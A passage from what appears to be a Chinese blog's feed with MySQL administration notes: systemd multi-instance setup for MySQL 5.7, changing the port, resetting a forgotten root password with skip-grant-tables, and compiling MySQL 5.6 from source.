ServerDocumentation=man:mysqld(8)Documentation=http://dev.mysql.com/doc/refman/en/using-systemd.htmlAfter=network.targetAfter=syslog.target[Install]WantedBy=multi-user.target[Service]User=mysqlGroup=mysqlType=forkingPIDFile=/data/mysql/3306/mysqld3306.pidTimeoutSec=0PermissionsStartOnly=trueExecStart=/usr/sbin/mysqld --defaults-file=/etc/my3306.cnf --daemonize --pid-file=/data/mysql/3306/mysqld3306.pid $MYSQLD_OPTSEnvironmentFile=-/etc/sysconfig/mysqlLimitNOFILE = 5000Restart=on-failureRestartPreventExitStatus=1PrivateTmp=falseEOF</code></pre><p><strong>&#x65B0;&#x589E;mysqld3307.service&#x542F;&#x52A8;&#x6587;&#x4EF6;</strong></p><pre><code class="json">cp /usr/lib/systemd/system/mysqld3306.service /usr/lib/systemd/system/mysqld3307.servicesed -i &apos;s/3306/3307/g&apos; /usr/lib/systemd/system/mysqld3307.service[root@jaking mysql5.7]# cat /usr/lib/systemd/system/mysqld3307.service[Unit]Description=MySQL ServerDocumentation=man:mysqld(8)Documentation=http://dev.mysql.com/doc/refman/en/using-systemd.htmlAfter=network.targetAfter=syslog.target[Install]WantedBy=multi-user.target[Service]User=mysqlGroup=mysqlType=forkingPIDFile=/data/mysql/3307/mysqld3307.pidTimeoutSec=0PermissionsStartOnly=trueExecStart=/usr/sbin/mysqld --defaults-file=/etc/my3307.cnf --daemonize --pid-file=/data/mysql/3307/mysqld3307.pid EnvironmentFile=-/etc/sysconfig/mysqlLimitNOFILE = 5000Restart=on-failureRestartPreventExitStatus=1PrivateTmp=false</code></pre><p><strong>&#x521D;&#x59CB;&#x5316;&#x591A;&#x5B9E;&#x4F8B;3306&#x3001;3307</strong></p><pre><code>mysqld --defaults-file=/etc/my3306.cnf --initialize --user=mysql --datadir=/data/mysql/3306/datamysqld --defaults-file=/etc/mysql3307.cnf --initialize --user=mysql --datadir=/data/mysql/3307/data</code></pre><p><strong>&#x542F;&#x52A8;&#x591A;&#x5B9E;&#x4F8B;3306&#x3001;3307</strong></p><pre><code>systemctl daemon-reloadsystemctl start mysqld3306systemctl start mysqld3307netstat -pantul | grep mysqlps aux | grep mysql</code></pre><p><strong>&#x67E5;&#x770B;MySQL root&#x521D;&#x59CB;&#x5BC6;&#x7801;</strong></p><pre><code>cat /data/mysql/3306/logs/mysqld3306.log | grep rootcat /data/mysql/3307/logs/mysqld3307.log | grep root</code></pre><p><strong>&#x767B;&#x5F55;&#x591A;&#x5B9E;&#x4F8B;&#x5E76;&#x4FEE;&#x6539;root&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;</strong></p><pre><code># mysql3306&#x5B9E;&#x4F8B;mysql -S /data/mysql/3306/mysql3306.sock -uroot -p </code></pre><pre><code class="sql"># &#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;newPassword&apos;;FLUSH PRIVILEGES;</code></pre><pre><code># mysql3307&#x5B9E;&#x4F8B;mysql -S /data/mysql/3307/mysql3307.sock -uroot -p</code></pre><pre><code class="sql"># &#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;New_password&apos;;FLUSH PRIVILEGES;</code></pre><h4 id="&#x589E;&#x52A0;&#x5B9E;&#x4F8B;"><a href="#&#x589E;&#x52A0;&#x5B9E;&#x4F8B;" class="headerlink" title="&#x589E;&#x52A0;&#x5B9E;&#x4F8B;"></a>&#x589E;&#x52A0;&#x5B9E;&#x4F8B;</h4><p><strong>&#x521B;&#x5EFA;&#x76EE;&#x5F55;&#xFF0C;&#x8BBE;&#x7F6E;&#x5C5E;&#x4E3B;&#x5C5E;&#x7EC4;</strong></p><pre><code>mkdir -p /data/mysql/3308/{data, binlog, logs}chown -Rf mysql:mysql /data/mysql/3308</code></pre><p><strong>&#x65B0;&#x589E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;my3308.cnf</strong></p><pre><code>cp /etc/my3306.cnf /etc/my3308.cnfsed -i &apos;s/3306/3308/g&apos; /etc/my3308.cnf</code></pre><pre><code class="sh">cat /etc/my3308.cnf[mysqld]user = mysqlport = 3308server_id = 3308datadir = /data/mysql/3308/datasocket = /data/mysql/3308/mysql3308.socksymbolic-links = 0log-error = /data/mysql/3308/logs/mysqld3308.logpid-file = /data/mysql/3308/mysqld3308.pid</code></pre><p><strong>&#x6DFB;&#x52A0;mysqld3308.service&#x542F;&#x52A8;&#x6587;&#x4EF6;</strong></p><pre><code>cp /usr/lib/systemd/system/mysqld3306.service /usr/lib/systemd/system/mysqld3308.servicesed -i &apos;s/3306/3308/g&apos; /usr/lib/systemd/system/mysqld3308.service</code></pre><pre><code class="sh">cat /usr/lib/systemd/system/mysqld3308.service[Unit]Description=MySQL ServerDocumentation=man:mysqld(8)Documentation=http://dev.mysql.com/doc/refman/en/using-systemd.htmlAfter=network.targetAfter=syslog.target[Install]WantedBy=multi-user.target[Service]User=mysqlGroup=mysqlType=forkingPIDFile=/data/mysql/3308/mysqld3308.pidTimeoutSec=0PermissionsStartOnly=trueExecStart=/usr/sbin/mysqld --defaults-file=/etc/my3308.cnf --daemonize --pid-file=/data/mysql/3308/mysqld3308.pid EnvironmentFile=-/etc/sysconfig/mysqlLimitNOFILE = 5000Restart=on-failureRestartPreventExitStatus=1PrivateTmp=false</code></pre><p><strong>&#x521D;&#x59CB;&#x5316;&#x65B0;&#x589E;&#x5B9E;&#x4F8B;3308</strong></p><pre><code>mysqld --defaults-file=/etc/my3308.cnf --initialize --user=mysql --datadir=/data/mysql/3308/data</code></pre><p><strong>&#x542F;&#x52A8;&#x65B0;&#x589E;&#x5B9E;&#x4F8B;3308</strong></p><pre><code>systemctl start mysqld3308netstat -nutpl | grep mysql</code></pre><p><strong>&#x83B7;&#x53D6;mysql3308 root&#x521D;&#x59CB;&#x5316;&#x5BC6;&#x7801;</strong></p><pre><code>cat /data/mysql/3308/logs/mysqld3308.log | grep root</code></pre><p><strong>&#x767B;&#x5F55;mysql3308&#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;</strong></p><pre><code>mysql -S /data/mysql/3308/mysql3308.sock -uroot -p</code></pre><pre><code class="sql">ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &quot;NewPassword&quot;;FLUSH PRIVILEGES;</code></pre><hr><hr><h2 id="&#x4FEE;&#x6539;MySQL&#x7AEF;&#x53E3;"><a href="#&#x4FEE;&#x6539;MySQL&#x7AEF;&#x53E3;" class="headerlink" title="&#x4FEE;&#x6539;MySQL&#x7AEF;&#x53E3;"></a>&#x4FEE;&#x6539;MySQL&#x7AEF;&#x53E3;</h2><pre><code>vim /etc/my.cnf[mysqld]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.socksymbolic-links=0port=3307log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.pidnetstat -pantul | grep 3307</code></pre><hr><hr><h2 id="MySQL-5-7-&#x5FD8;&#x8BB0;root&#x5BC6;&#x7801;"><a href="#MySQL-5-7-&#x5FD8;&#x8BB0;root&#x5BC6;&#x7801;" class="headerlink" title="MySQL 5.7 &#x5FD8;&#x8BB0;root&#x5BC6;&#x7801;"></a>MySQL 5.7 &#x5FD8;&#x8BB0;root&#x5BC6;&#x7801;</h2><p><strong>&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7ED5;&#x8FC7;&#x5BC6;&#x7801;&#x9A8C;&#x8BC1;</strong></p><pre><code>echo skip-grant-tables &gt;&gt; /etc/my.cnf/etc/init.d/mysqld restart</code></pre><p><strong>&#x4FEE;&#x6539;&#x6570;&#x636E;&#x5E93;root&#x5BC6;&#x7801;</strong></p><pre><code>mysql</code></pre><pre><code class="sql">ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;new_Password&apos;;FLUSH PRIVILEGES;</code></pre><p><strong>&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5220;&#x9664;skil-grant-tables&#xFF0C;&#x6062;&#x590D;&#x5BC6;&#x7801;&#x9A8C;&#x8BC1;</strong></p><p><strong>&#x91CD;&#x542F;MySQL</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x6E90;&amp;#x7801;&amp;#x5B89;&amp;#x88C5;MySQL-5-7&quot;&gt;&lt;a href=&quot;#&amp;#x6E90;&amp;#x7801;&amp;#x5B89;&amp;#x88C5;MySQL-5-7&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x6E90;&amp;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL5.6</title>
    <link href="https://marnm.github.io//posts/16fc5dc4/"/>
    <id>https://marnm.github.io//posts/16fc5dc4/</id>
    <published>2022-06-07T04:43:37.000Z</published>
    <updated>2022-06-07T05:15:22.592Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x6E90;&#x7801;&#x5B89;&#x88C5;MySQL-5-6"><a href="#&#x6E90;&#x7801;&#x5B89;&#x88C5;MySQL-5-6" class="headerlink" title="&#x6E90;&#x7801;&#x5B89;&#x88C5;MySQL 5.6"></a>&#x6E90;&#x7801;&#x5B89;&#x88C5;MySQL 5.6</h2><p><strong>1. &#x5B89;&#x88C5;&#x4F9D;&#x8D56;&#x5305;&#x53CA;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;</strong></p><pre><code>[root@localhost ~]# cd /usr/local/src[root@localhost src]# yum install &#x2010;y  gcc*  make  ncurses* perl* </code></pre><p><strong>2. &#x5B89;&#x88C5;CMake&#x7F16;&#x8BD1;&#x5DE5;&#x5177;</strong></p><pre><code>[root@localhost src]# tar xvf cmake&#x2010;2.8.11.2.tar.gz[root@localhost src]# cd cmake&#x2010;2.8.11.2[root@localhost cmake&#x2010;2.8.11.2]# ./configure[root@localhost cmake&#x2010;2.8.11.2]# make[root@localhost cmake&#x2010;2.8.11.2]# make install</code></pre><p><strong>3. &#x914D;&#x7F6E;MySQL</strong></p><p>&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x6267;&#x884C;MySQL&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x8D26;&#x6237;</p><pre><code>[root@localhost cmake&#x2010;2.8.11.2]# cd ..[root@localhost src]# useradd mysql &#x2010;s /sbin/nologin</code></pre><p>&#x521B;&#x5EFA;&#x7528;&#x4E8E;&#x4FDD;&#x5B58;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x548C;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x5E76;&#x628A;&#x8BE5;&#x76EE;&#x5F55;&#x7684;&#x6240;&#x6709;&#x8005;&#x548C;&#x6240;&#x5C5E;&#x7EC4;&#x8EAB;&#x4EFD;<br>&#x4FEE;&#x6539;&#x4E3A;mysql  &#x5176;&#x4E2D;&#xFF0C;/usr/local/mysql &#x662F;&#x7528;&#x4E8E;&#x4FDD;&#x5B58;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x76EE;<br>&#x5F55;&#xFF0C;/usr/local/mysql/var &#x5219;&#x662F;&#x7528;&#x4E8E;&#x4FDD;&#x5B58;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;</p><pre><code>[root@localhost src]# mkdir &#x2010;p /usr/local/mysql/var[root@localhost src]# chown &#x2010;Rf mysql:mysql /usr/local/mysql</code></pre><p>&#x89E3;&#x538B;&#x3001;&#x7F16;&#x8BD1;&#x3001;&#x5B89;&#x88C5; MySQL &#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x3002;&#x5728;&#x7F16;&#x8BD1;&#x6570;&#x636E;&#x5E93;&#x65F6;&#x4F7F;&#x7528;&#x7684;&#x662F; cmake &#x547D;&#x4EE4;&#xFF0C;&#x5176;<br>&#x4E2D;&#xFF0C;-DCMAKE_INSTALL_PREFIX &#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;-<br>DMYSQL_DATADIR &#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;-DSYSCONFDIR &#x5219;&#x662F;&#x5B9A;&#x4E49;<br>MySQL &#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;</p><pre><code>[root@localhost src]# tar xvf mysql&#x2010;5.6.19.tar.gz[root@localhost src]# cd mysql&#x2010;5.6.19[root@localhost mysql&#x2010;5.6.19]# cmake . &#x2010;DCMAKE_INSTALL_PREFIX=/usr/local/mysql &#x2010;DMYSQL_DATADIR=/usr/local/mysql/var &#x2010;DSYSCONFDIR=/etc[root@localhost mysql&#x2010;5.6.19]# make &amp;&amp; make install</code></pre><p>&#x4E3A;&#x4E86;&#x8BA9; MySQL &#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x6B63;&#x5E38;&#x8FD0;&#x8F6C;&#x8D77;&#x6765;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5220;&#x9664; /etc &#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x5728; MySQL &#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55; scripts &#x5185;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; mysql_install_db &#x7684;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#xFF0C;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x5E76;&#x4F7F;&#x7528; &#x2013;user &#x53C2;&#x6570;&#x6307;&#x5B9A; MySQL &#x670D;&#x52A1;&#x7684;&#x5BF9;&#x5E94;&#x8D26;&#x53F7;&#x540D;&#x79F0;&#xFF08;&#x5728;&#x524D;&#x9762;&#x6B65;&#x9AA4;&#x5DF2;&#x7ECF;&#x521B;&#x5EFA;&#xFF09;&#xFF0C;&#x4F7F;&#x7528; &#x2013;basedir &#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL &#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x4F7F;&#x7528; &#x2013;datadir &#x53C2;&#x6570;<br>&#x6307;&#x5B9A; MySQL &#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x8FD9;&#x6837;&#x5373;&#x53EF;&#x751F;&#x6210;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x4F1A;&#x751F;&#x6210;&#x65B0;&#x7684;MySQL &#x670D;&#x52A1;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p><pre><code> [root@localhost mysql&#x2010;5.6.19]# rm &#x2010;rf /etc/my.cnf [root@localhost mysql&#x2010;5.6.19]# cd /usr/local/mysql [root@localhost mysql]# ./scripts/mysql_install_db &#x2010;&#x2010;user=mysql &#x2010;&#x2010;basedir=/usr/local/mysql &#x2010;&#x2010;datadir=/usr/local/mysql/var</code></pre><p>&#x628A;Linux&#x7CFB;&#x7EDF;&#x65B0;&#x751F;&#x6210;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x94FE;&#x63A5;&#x5230;/etc&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x7A0B;&#x5E8F;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x5F00;&#x673A;&#x7A0B;&#x5E8F;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;/etc/rc.d/init.d&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x4EE5;&#x4FBF;&#x901A;&#x8FC7;service&#x547D;&#x4EE4;&#x6765;&#x7BA1;&#x7406;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x3002;&#x8BB0;&#x5F97;&#x628A;&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x4FEE;&#x6539;&#x6210;755&#x4EE5;&#x4FBF;&#x4E8E;&#x8BA9;&#x7528;&#x6237;&#x6709;&#x6267;&#x884C;&#x8BE5;&#x811A;&#x672C;&#x7684;&#x6743;&#x9650;</p><pre><code> [root@localhost mysql]# ls bin data include lib my.cnf README share support&#x2010;files COPYING docs INSTALL&#x2010;BINARY man mysql&#x2010;test scripts sql&#x2010;bench var [root@localhost mysql]# ln &#x2010;s my.cnf /etc/my.cnf [root@localhost mysql]# cp ./support&#x2010;files/mysql.server /etc/rc.d/init.d/mysqld [root@localhost mysql]# chmod 755 /etc/rc.d/init.d/mysqld</code></pre><p>&#x7F16;&#x8F91;&#x521A;&#x521A;&#x590D;&#x5236;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x628A;&#x7B2C;46&#x3001;47&#x884C;&#x7684;basedir&#x4E0E;datadir&#x53C2;&#x6570;&#x5206;&#x522B;&#x4FEE;&#x6539;<br>&#x4E3A;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#x548C;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;</p><pre><code class="shell"> [root@localhost mysql]# vim /etc/rc.d/init.d/mysqld  46 basedir=/usr/local/mysql  47 datadir=/usr/local/mysql/var</code></pre><p>&#x914D;&#x7F6E;&#x597D;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x540E;&#x4FBF;&#x53EF;&#x4EE5;&#x7528;service&#x547D;&#x4EE4;&#x542F;&#x52A8;mysqld&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x4E86;&#x3002;mysqld&#x662F;MySQL&#x6570;&#x636E;<br>&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x670D;&#x52A1;&#x540D;&#x79F0;&#xFF0C;&#x6CE8;&#x610F;&#x4E0D;&#x8981;&#x5199;&#x9519;&#x3002;&#x518D;&#x4F7F;&#x7528;chkconfig&#x547D;&#x4EE4;&#x628A;mysqld&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x52A0;&#x5165;&#x5230;&#x5F00;&#x673A;<br>&#x542F;&#x52A8;&#x9879;&#x4E2D;</p><pre><code> [root@localhost mysql]# service mysqld start Unit mysqld.service could not be found. Starting MySQL. SUCCESS! [root@localhost mysql]# chkconfig mysqld on</code></pre><p>&#x5728;/etc/profile&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x6700;&#x540E;&#x52A0;&#x5165;export PATH=$PATH:/usr/local/mysql/bin</p><pre><code class="shell"> [root@localhost mysql]# vim /etc/profile  export PATH=$PATH:/usr/local/mysql/bin</code></pre><p>MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x8FD8;&#x4F1A;&#x8C03;&#x7528;&#x5230;&#x4E00;&#x4E9B;&#x7A0B;&#x5E8F;&#x6587;&#x4EF6;&#x548C;&#x51FD;&#x6570;&#x5E93;&#x6587;&#x4EF6;&#x3002;&#x7531;&#x4E8E;&#x5F53;&#x524D;&#x662F;&#x901A;&#x8FC7;&#x6E90;&#x7801;&#x5305;&#x65B9;&#x5F0F;&#x5B89;&#x88C5;MySQL&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x56E0;&#x6B64;&#x73B0;&#x5728;&#x4E5F;&#x5FC5;&#x987B;&#x4EE5;&#x624B;&#x52A8;&#x65B9;&#x5F0F;&#x628A;&#x8FD9;&#x4E9B;&#x6587;&#x4EF6;&#x94FE;&#x63A5;&#x8FC7;&#x6765;</p><pre><code> [root@localhost mysql]# mkdir  /var/lib/mysql [root@localhost mysql]# ln &#x2010;s /usr/local/mysql/lib/mysql  /usr/lib/mysql [root@localhost mysql]# ln &#x2010;s /var/lib/mysql/mysql.sock  /tmp/mysql.sock  [root@localhost mysql]# ln &#x2010;s /usr/local/mysql/include/mysql  /usr/include/mysql</code></pre><p>&#x73B0;&#x5728;&#xFF0C;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x5DF2;&#x7ECF;&#x542F;&#x52A8;&#xFF0C;&#x8C03;&#x7528;&#x7684;&#x5404;&#x4E2A;&#x51FD;&#x6570;&#x6587;&#x4EF6;&#x5DF2;&#x7ECF;&#x5C31;&#x4F4D;&#xFF0C;PATH&#x73AF;&#x5883;&#x53D8;&#x91CF;<br>&#x4E2D;&#x4E5F;&#x52A0;&#x5165;&#x4E86;MySQL&#x6570;&#x636E;&#x5E93;&#x547D;&#x4EE4;&#x7684;&#x6240;&#x5728;&#x76EE;&#x5F55;&#x3002;&#x63A5;&#x4E0B;&#x6765;&#x51C6;&#x5907;&#x5BF9;MySQL&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x521D;&#x59CB;&#x5316;&#xFF0C;&#x8FD9;&#x4E2A;<br>&#x521D;&#x59CB;&#x5316;&#x7684;&#x914D;&#x7F6E;&#x8FC7;&#x7A0B;&#x4E0E;MariaDB&#x6570;&#x636E;&#x5E93;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x53EA;&#x662F;&#x6700;&#x540E;&#x53D8;&#x6210;&#x4E86;Thanks for using MySQL!</p><p><code>&#x6CE8;&#x610F;&#xFF1A;&#x5982;&#x679C; mysql_secure_installation &#x627E;&#x4E0D;&#x5230;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x6267;&#x884C; source /etc/profile &#x540E;&#xFF0C;&#x518D;&#x6267;&#x884C; mysql_secure_installation &#x6765;&#x521D;&#x59CB;&#x5316;MySQL&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x6216;&#x8005;&#x91CD;&#x65B0;&#x8FDE;&#x63A5; Linux &#x7CFB;&#x7EDF;&#x540E;&#x518D;&#x4F7F;&#x7528; mysql_secure_installation &#x6765;&#x521D;&#x59CB;&#x5316;MySQL&#x6570;&#x636E;&#x5E93;&#x3002;</code></p><pre><code> [root@localhost ~]# mysql_secure_installation NOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MySQL SERVERS IN PRODUCTION USE! PLEASE READ EACH STEP CAREFULLY! In order to log into MySQL to secure it, we&apos;ll need the current password for the root user. If you&apos;ve just installed MySQL, and you haven&apos;t set the root password yet, the password will be blank, so you should just press enter here. Enter current password for root (enter for none): &#x6B64;&#x5904;&#x53EA;&#x9700;&#x6309;&#x4E0B;&#x56DE;&#x8F66;&#x952E; OK, successfully used password, moving on... Setting the root password ensures that nobody can log into the MySQL root user without the proper authorisation. Set root password? [Y/n] y &#xFF08;&#x8981;&#x4E3A;root&#x7BA1;&#x7406;&#x5458;&#x8BBE;&#x7F6E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5BC6;&#x7801;&#xFF09; New password: &#x8F93;&#x5165;&#x8981;&#x4E3A;root&#x7BA1;&#x7406;&#x5458;&#x8BBE;&#x7F6E;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5BC6;&#x7801; Re&#x2010;enter new password: &#x518D;&#x8F93;&#x5165;&#x4E00;&#x6B21;&#x5BC6;&#x7801; Password updated successfully! Reloading privilege tables.. ... Success! By default, a MySQL installation has an anonymous user, allowing anyone to log into MySQL without having to have a user account created for them. This is intended only for testing, and to make the installation go a bit smoother. You should remove them before moving into a production environment. Remove anonymous users? [Y/n] y &#xFF08;&#x5220;&#x9664;&#x533F;&#x540D;&#x8D26;&#x6237;&#xFF09; ... Success! Normally, root should only be allowed to connect from &apos;localhost&apos;. This ensures that someone cannot guess at the root password from the network. Disallow root login remotely? [Y/n] y &#xFF08;&#x7981;&#x6B62;root&#x7BA1;&#x7406;&#x5458;&#x4ECE;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#xFF09; ... Success! By default, MySQL comes with a database named &apos;test&apos; that anyone can access. This is also intended only for testing, and should be removed before moving into a production environment. Remove test database and access to it? [Y/n] y &#xFF08;&#x5220;&#x9664;test&#x6570;&#x636E;&#x5E93;&#x5E76;&#x53D6;&#x6D88;&#x5BF9;&#x5176;&#x7684;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#xFF09; &#x2010; Dropping test database... ... Success! &#x2010; Removing privileges on test database... ... Success! Reloading the privilege tables will ensure that all changes made so far will take effect immediately. Reload privilege tables now? [Y/n] y &#xFF08;&#x5237;&#x65B0;&#x6388;&#x6743;&#x8868;&#xFF0C;&#x8BA9;&#x521D;&#x59CB;&#x5316;&#x540E;&#x7684;&#x8BBE;&#x5B9A;&#x7ACB;&#x5373;&#x751F;&#x6548;&#xFF09; ... Success! All done! If you&apos;ve completed all of the above steps, your MySQL installation should now be secure. Thanks for using MySQL! Cleaning up...</code></pre><p>&#x767B;&#x5F55;MySQL&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x505A;&#x7B80;&#x5355;&#x64CD;&#x4F5C;&#xFF0C;&#x9A8C;&#x8BC1;&#x6570;&#x636E;&#x5E93;&#x662F;&#x5426;&#x6B63;&#x5E38;</p><pre><code class="sql"> [root@localhost ~]# mysql &#x2010;u root &#x2010;p Enter password: Welcome to the MySQL monitor. Commands end with ; or \g. Your MySQL connection id is 12 Server version: 5.6.19 Source distribution Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement. mysql&gt; show databases; +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ | Database | +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ | information_schema | | mysql | | performance_schema | +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ 3 rows in set (0.00 sec) mysql&gt; create database test; Query OK, 1 row affected (0.00 sec) mysql&gt; show databases; +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ | Database | +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ | information_schema | | mysql | | performance_schema | | test | +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ 4 rows in set (0.00 sec) mysql&gt; create database test2; Query OK, 1 row affected (0.00 sec) mysql&gt; show databases; +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ | Database | +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ | information_schema | | mysql | | performance_schema | | test | | test2 | 